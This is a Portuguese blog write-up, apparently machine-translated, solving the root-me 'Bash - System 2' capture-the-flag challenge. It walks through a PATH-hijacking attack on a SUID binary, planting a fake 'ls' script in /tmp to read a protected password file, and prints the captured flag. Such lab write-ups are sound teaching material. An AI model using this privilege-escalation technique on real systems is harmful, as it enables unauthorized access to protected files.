---
title: "Bash - Sistema 2 - root-me.org"
date: 2023-12-05
published: true
lang: pt-BR
translation_key: "bash-system-2-root-me"
original_url: /bash-system-2-root-me
permalink: /pt-br/bash-system-2-root-me
---
# [](#intro)Introdução

Desde que acabamos de resolver Bash - Sistema 1 (você pode confirmá-lo [here](bash-system-1-root-me)), vamos resolver seu segundo nível também. Este desafio é muito semelhante ao último, mas com uma reviravolta.

# [](#level-description)Challenge description

A «declaração» para este desafio é o seguinte código C:

```c
    #include <stdlib.h>
    #include <stdio.h>
    #include <unistd.h>
    #include <sys/types.h>
     
    int main(){
        setreuid(geteuid(), geteuid());
        system("ls -lA /challenge/app-script/ch12/.passwd");
        return 0;
    }
```
Para nos ligarmos à sala, podemos SSH:

`ssh -p 2222 app-script-ch12@challenge02.root-me.org`

com a senha `app-script-ch12`.

# [](#approach)Aproxime-se da mentalidade

Vamos começar a construir alguns calos novamente, desenvolvendo nossa abordagem mentalidade passo a passo. Para este problema, já abordamos os conceitos básicos em nosso desafio anterior de Capturar a Bandeira (CTF).

## [](#mindset-step1)Passo 1 - Compreendendo conceitos básicos

Se você não está familiarizado com as funções `setreuid` e `system`, vá verificar na minha última solução CTF para Bash - Sistema 1, que discutimos completamente [here](bash-system-1-root-me#step-1---understanding-basic-concepts).

## [](#mindset-step2)Passo 2 - Compreender o problema

Podemos ver que este desafio é bastante semelhante ao desafio Bash - Sistema 1. No entanto, temos algo novo aqui. No CTF anterior, vimos que a linha `system` era simplesmente um comando `ls`. Neste nível, a complexidade aumenta com a adição de um switch ao comando `ls`, como visto na seguinte linha de código:

`system("ls -lA /challenge/app-script/ch12/.passwd");`

Note que temos o switch `-lA` passado como argumento para o comando `ls`. Vamos entrar na máquina e dar uma vista de olhos.

```bash
app-script-ch12@challenge02:~$ ls -la
total 32
dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Dec 10  2021 .
drwxr-xr-x 25 root                    root                    4096 Sep  5 14:00 ..
-r--------  1 root                    root                     640 Dec 10  2021 ._perms
-rw-r-----  1 root                    root                      43 Dec 10  2021 .git
-r--r-----  1 app-script-ch12-cracked app-script-ch12-cracked   14 Dec 10  2021 .passwd
-rwsr-x---  1 app-script-ch12-cracked app-script-ch12         7252 Dec 10  2021 ch12
-r--r-----  1 app-script-ch12         app-script-ch12          204 Dec 10  2021 ch12.c
```
Como podemos ver, precisamos encontrar uma maneira de `cat` o arquivo `.passwd` através do binário `ch12`, que é a versão compilada do `ch12.c`. O problema é exatamente o mesmo que o anterior em Bash - Sistema 1. O bit `ch12` SUID é definido, o que significa que a função `system`, juntamente com o `setreuid`, irá garantir que o script executa o comando como `app-script-ch12-cracked`, concedendo as permissões certas que precisamos ler `.passwd`.

Poderíamos pensar em uma maneira de enganar o programa para pensar que ele executou o comando `ls`, mas atualmente executa o comando `cat`. No entanto, o interruptor `-lA` tornará isso insuportável. A coisa é que o comando `cat` não tem estes dois interruptores usados aqui.

Bem, já sabemos como fazer o programa executar um comando `ls` criado. Só precisamos de encontrar uma maneira de o fazer ignorar o interruptor. Esse é o nosso objectivo!

## [](#mindset-step3)Passo 3 - Criando o ataque

Vamos começar a resolver este desafio fazendo exatamente o que fizemos em Bash - Sistema 1:

1. Primeiro, vamos para o diretório `/tmp` e fazemos um novo diretório. Então, `cd` nele:

```bash
app-script-ch12@challenge02:~$ mkdir /tmp/cecil
app-script-ch12@challenge02:~$ cd /tmp/cecil
app-script-ch12@challenge02:/tmp/cecil$ 
```
2. Agora, exportamos este caminho para nossa variável $PATH com o seguinte comando:

```bash
app-script-ch12@challenge02:/tmp/cecil$ export PATH=/tmp/cecil:$PATH
app-script-ch12@challenge02:/tmp/cecil$ echo $PATH
/tmp/cecil:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
```
Esta parte já está feita. A nova variável $PATH inclui nosso novo caminho como primeiro, o que significa que qualquer script irá priorizá-lo ao procurar comandos para executar. Agora vem a parte complicada.

Para fazer um ponto, vamos tentar resolver isso (erronely) com a mesma abordagem usada em Bash - Sistema 1. Copiamos o binário `/bin/cat` para `/tmp/cecil` com o nome de `ls`. Depois disso, rodamos o binário `ch12` para ler o conteúdo do `.passwd`:

```bash
app-script-ch12@challenge02:/tmp/cecil$ cp /bin/cat ls
app-script-ch12@challenge02:/tmp/cecil$ cd -
/challenge/app-script/ch12
app-script-ch12@challenge02:~$ ./ch12
ls: invalid option -- 'l'
Try 'ls --help' for more information.
```
Como podemos ver, isso não funciona, e a razão é exatamente por causa do interruptor `-lA`. Teria funcionado se não tivéssemos estes interruptores.

## # Abusando do comando `chmod`

Uma maneira que eu pensei em contornar isso é escrevendo um script bash chamado `ls` que continha um comando para ler `.passwd`. Mas para isso, precisamos de acesso ao `chmod`. Podemos testar isso em nosso diretório `/tmp/cecil` criando um script bash chamado `test` e tornando-o um executável com `chmod +x test`. Para nosso script `test`, nós o escrevemos com Vim:

```bash
#!/bin/bash
echo "hi mom"
```
Seguido por:

```bash
app-script-ch12@challenge02:/tmp/cecil$ chmod +x test
app-script-ch12@challenge02:/tmp/cecil$ ./test
hi mom
```
Como podemos ver, podemos usar `chmod` para criar scripts executáveis bash. Como estamos dentro de um diretório incluído na variável caminho, poderíamos criar um script de bash `ls` com um comando cat dentro dele:

```bash
#!/bin/bash
cat
```
e depois:

```bash
app-script-ch12@challenge02:/tmp/cecil$ chmod +x ls
```
## [](#mindset-step4)Passo 4 - Resolvendo!

Está bem. Temos um script bash que imita o comando `cat` disfarçado de `ls`. Vamos experimentar.

Tentativa 1

Se tentarmos executar o binário `ch12` nestas circunstâncias, isto é o que acontece:

```bash
app-script-ch12@challenge02:~$ ./ch12

```
Nada. Porquê? Eis o que está acontecendo: o `./ch12` está procurando o binário chamado `ls`, que neste caso é um script bash que executa um comando vazio `cat`. Mas o que acontece com o resto da string na função `system`, você pergunta? Bem, eles são tratados como argumentos de linha de comando para o nosso script bash!

Para testar essa hipótese, vamos mudar nosso script de bash `ls` para o seguinte:

```bash
#!/bin/bash
echo "False command: $0"
echo "Arguments: $@"
```
Agora, quando nosso comando `ls` for executado, ele imprimirá seu caminho e os argumentos serão passados após ele. Se nossa hipótese estiver correta, quando executarmos o `ch12` agora, ele deve imprimir o resto da string como argumentos:

```bash
app-script-ch12@challenge02:~$ ./ch12
False command: /tmp/cecil/ls
Arguments: -lA /challenge/app-script/ch12/.passwd
```
Incrível! É nos erros que criamos uma solução!

Tentativa 2

Desde que nos livramos da bandeira `-lA`, fazendo-a passar como argumentos do nosso falso script `ls`, podemos mudar o `ls` script bash para simplesmente `cat /challenge/app-script/ch12/.passwd`:

```bash
#!/bin/bash
cat /challenge/app-script/ch12/.passwd
```
Agora, rodamos o binário `ch12` novamente:

```bash
app-script-ch12@challenge02:~$ ./ch12
8a95eDS/*e_T#
```
E apanhamos a bandeira!

# [](#conclusions)Conclusão

Neste CTF, nós mergulhamos em outra camada de complexidades do sistema e a exploração de funções C. Começamos por dissecar os elementos centrais apresentados pelo roteiro de desafio, progredindo para identificar possíveis avenidas de exploração.

A estratégia foi construída em torno do conceito de substituição de comandos, viabilizado pelo diretório `/tmp` e manipulando a variável $PATH. Isso nos permitiu criar um comando `ls` substituto que redirecionou o fluxo de execução do comando `ls -lA` pretendido para o nosso script bash. Ao criar um script bash, o comando `ls` foi tratado como um executável e o resto da string como argumentos, eliminando o switch `-lA`.

Tudo isto foi possível devido ao fato de já termos enfrentado um problema semelhante, e porque tentámos uma tentativa fracassada primeiro. Lembre-se, é nas falhas que encontramos a solução!

Obrigado por ficar até o fim. Espero que tenhas aprendido algo novo hoje! E lembre-se, sempre faça sua pesquisa **!

<a href="/">Voltar</a>






